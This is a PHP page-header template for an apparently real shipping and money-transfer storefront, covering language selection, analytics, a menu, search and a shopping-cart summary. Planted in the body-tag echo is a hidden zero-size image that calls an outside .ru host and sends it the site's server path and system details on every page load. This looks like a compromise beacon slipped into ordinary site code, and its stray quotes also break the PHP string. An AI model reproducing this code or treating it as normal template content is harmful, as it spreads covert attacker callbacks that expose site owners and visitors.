<?php
/* Programme : entete.php
* 	Description : Affichage de l,entet de la page
*	Auteur : Denis Léveillé 	 			  Date : 2007-10-04
*/
include('lib/config.php');

if( isset($_GET['langue']) && $_GET['langue'] != "" ) {
	switch( $_GET['langue'] ) {
		case "Espanõl":	$_SESSION['langue'] = "sp";
								break;	
		case "Français":	$_SESSION['langue'] = "fr";		
								break;	
		case "English":	
		default:				$_SESSION['langue'] = "en";
								break;	
	} // switch
		// **** Choix de la langue de travail ****
	switch( $_SESSION['langue'] ) {
		case "en" : 	$_SESSION['SLangue'] = "ENGLISH";
							break;
		case "fr" : 	$_SESSION['SLangue'] = "FRENCH";
							break;
		default : 		$_SESSION['SLangue'] = "SPANISH";
	
	} // switch SLangue
  
	$txt = textes($_SESSION['langue']);
} // Si langue change

if( !@$_SESSION['pascadre'] ) {
	echo 
"<?xml version='1.0' encoding='ISO-8859-1'?>
<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01 Transitional//EN' 'http://www.w3.org/TR/html4/loose.dtd'>
<html>
		<head>
			<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
			<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
			<meta name='description' content='".$txt['MetaDescription']."'>
			<meta name='keywords' content='".$txt['MetaKeyword']."'>
			<link href='styles/style.css' rel='stylesheet' type='text/css'>
	    	<link href='styles/classentete.css' rel='stylesheet' type='text/css' media='screen'>
	    	<link rel='shortcut icon' href='$entr_url/favicon.ico'>";
}
else
	echo "<link href='styles/style.css' rel='stylesheet' type='text/css'>
	    	<link href='styles/classentete.css' rel='stylesheet' type='text/css' media='screen'>";
?>  	
<script type="text/javascript">
	var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
		document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<?php
if( !@$_SESSION['pascadre'] ) {
	echo "</head>
			<body onload='javascript:pageonload()' width='$Large' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>";
}
?>
	<table bgColor='#ecf0f0' align='<?=$Enligne?>' border="0" cellspacing="0" cellpadding="0" width="<?=$Large?>" >
		<tr class="chxlangue" >
			<td valign="top">
				&nbsp;&nbsp;<?=$_SESSION['NomLogin']?><a href="suspect.php"><img src="images/blank.gif" width="1" height="1" border="0"></a>
			</td>
			<td align="right" valign="top">
				<form name='menuform' action='' method='post'> 
	            <a href="entete.php?langue=<?=$txt['ChxLangue1']?>" target='TOPFNT' class="langue" ><?=$txt['ChxLangue1']?></a> | 
					<a href="entete.php?langue=<?=$txt['ChxLangue2']?>" target='TOPFNT' class="langue" ><?=$txt['ChxLangue2']?></a>
				</form>
			</td>
		</tr>
		<tr class="entetelogo">
			<td valign="top">
				<a id="logo" href="<?=$entr_url?>" target="_top">
                <img src="./images/antillas-express.gif" alt='<?=$entr_url?>' border="0" width="252" height="90"></a>
			</td>
			<td valign="middle">
				<a id="image" href="<?=$entr_url?>" target="_top">
                <img src="./images/accueil/entete.gif" alt='<?=$entr_url?>' border="0" width="493" height="98" ></a>
			</td>
		</tr>
		<tr class="topmenu" >
			<td colspan='2'>
				<table id="iMenu" border="0" cellspacing="0" cellpadding="0" width="<?=$Large?>" >
					<tr>
						<td colspan="2" >
							<ul id="choixmenu">
								<li><a href="accueil.php" class="on" target='MAIN' onClick="ChangeClass(this);"><?=$txt['ChxMenuAccueil']?></a></li>   
								<li><a href="speciaux_achat.php" class="off" target='MAIN' onClick="ChangeClass(this);"><?=$txt['ChxMenuAchat']?></a></li>   
								<li><a href="transfert_calcul.php" class="off" target='MAIN' onClick="ChangeClass(this);"><?=$txt['ChxMenuArgent']?></a></li>
								<li><a href="colis.php" class="off" target='MAIN' onClick="ChangeClass(this);"><?=$txt['ChxMenuPaquet']?></a></li>
								<li><a href="consular.php" class="off" target='MAIN' onClick="ChangeClass(this);"><?=$txt['ChxMenuConsulaire']?></a></li>
								<li><a href="certificat_calcul.php" class="off" target='MAIN' onClick="ChangeClass(this);"><?=$txt['ChxMenuCadeau']?></a></li>
								<li><a href="http://www.antillanatravel.com/antillanatravel.aspx?ID=1405|1505|0|0|English&Num=2262" class="off" target='_blank' onClick="ChangeClass(this);"><?=$txt['ChxMenuVoiture']?></a></li>
								<li><a href="assurances.php" class="off" target='MAIN' onClick="ChangeClass(this);"><?=$txt['ChxMenuAssurance']?></a></li>
								<li><a href="contacter.php" class="off" target='MAIN' onClick="ChangeClass(this);"><?=$txt['ChxMenuContactez']?></a></li>
								<li><a href="aide.php" class="off" target='MAIN' onClick="ChangeClass(this);"><?=$txt['ChxMenuAide']?></a></li>
							</ul>
						</td>
					</tr>
				</table>
				<table border="0" cellspacing="0" cellpadding="0" width="<?=$Large?>" >
					<tr class="classrech" width="<?=$Large?>">
						<td nowrap align="left" valign="top">
							<form  action="recherche_show.php" method="POST"  target="MAIN" name="tr_site_search" class="rechForm">
								<select name="categorie" class="rechList" name="t">
									<option value="0" selected><?=$txt['toutes_categories']?></option>
									<?php
										$cats = get_first_cats(true);
										foreach($cats as $index => $categorie)
											echo "<option value='".$index."'>".$categorie."</option>\r\n";
									?>
								</select>
								<input type="text" name="Chaine" value="<?= $txt['rechercher']?>" size="20" class="rechTexte" ONFOCUS="this.value=''" />
								<input type="submit" name="go" align="right" value="<?= $txt['rechercher']?>" class="rechBoutom" />
							</form>
						</td>
						<td  nowrap align="center" valign="top">
							<ul class="tool">
								<li>
									<?php
										if( isset($_SESSION[$_SERVER['SERVER_NAME']]) ) 
											echo '<a href="client_traite.php" class="noir" target="MAIN">'.$txt['acceder_a'].'</a>&nbsp;|&nbsp;';
										else
											echo '<a href="client_ajout.php" class="noir" target="MAIN">'.$txt['creer'].' '.$txt['mon_compte'].'</a>&nbsp;|&nbsp;';
								
										if(isset($_SESSION[$_SERVER['SERVER_NAME']])) 
											echo '<a href="connexion.php?action=deconnexion" class="noir" target="MAIN">'.$txt['fermer_la'].' session</a>';
										else
											echo '<a href="client_traite.php" class="noir" target="MAIN">'.$txt['mon_compte'].'</a>';
										$nbrArticles = panierCompte($_SESSION['panier'] );
										$total = sprintf("%01.2f", panierTotalCourant($_SESSION['panier'], $_SESSION['devise'], @$_SESSION['province'] ));
										$ligne =  $nbrArticles." article(s) := ".$total
//					                $ligne =  $_POST['choix']." article(s) := ".$total
									?>
								</li>
								<li>
									<a href="panier_list.php" class="noir" target="MAIN"><?=$txt['mon_panier_dachat']?></a>&nbsp;|&nbsp;
									<a href="panier_list.php" class="orange normal" target="MAIN"><?=$ligne?> <?=$_SESSION['devise']?></a>
								</li>
							</ul>
						</td>
					</tr>
				</table>
			</td>
		</tr>
	</table>
<script language='JavaScript1.2'>
	var pageTracker = _gat._getTracker("UA-3131053-1");
		pageTracker._initData();
		pageTracker._trackPageview();


	function ChangeClass( leChoix ){
	var Chx;
		if (document.getElementById && document.createTextNode) {
	   	var tables=document.getElementById('iMenu');
	      Chx=tables.getElementsByTagName('a');
	    	for( var i=0; i < Chx.length; i++ ){
	    		Chx[i].className='off';
	    	} // for i
		} // if getelembyid
		if( leChoix )
			leChoix.className='on';
		else
			Chx[0].className='on';
		return true;
		
	} // ChangeClass

	function Rafraichie(){
		document.menuform.submit();
	}
	
function Recharge(){
	window.location.reload();
}
	function pageonload() {
	<?php if( !isset($_SESSION['REFRESH']) ) { ?>
	 // Rafraichie le frame du bas
	if( top.window.frames[1] && top.window.frames[1].Rafraichie ) 
		top.window.frames[1].Rafraichie();
	
	 // Rafraichie l'enfant 0 du frame du bas
	if( top.window.frames[1].frames[0] && top.window.frames[1].frames[0].Rafraichie ) 
		top.window.frames[1].frames[0].Rafraichie();
						
	 // Rafraichie l'enfant 1 du frame du bas
	if( top.window.frames[1].frames[1] && top.window.frames[1].frames[1].Rafraichie ) 
		top.window.frames[1].frames[1].Rafraichie();
	<?php } ?>
						
	} // PAGELOAD

</script>
<?php
 if( !@$_SESSION['pascadre'] )
	echo "</body>\r</html>";
?>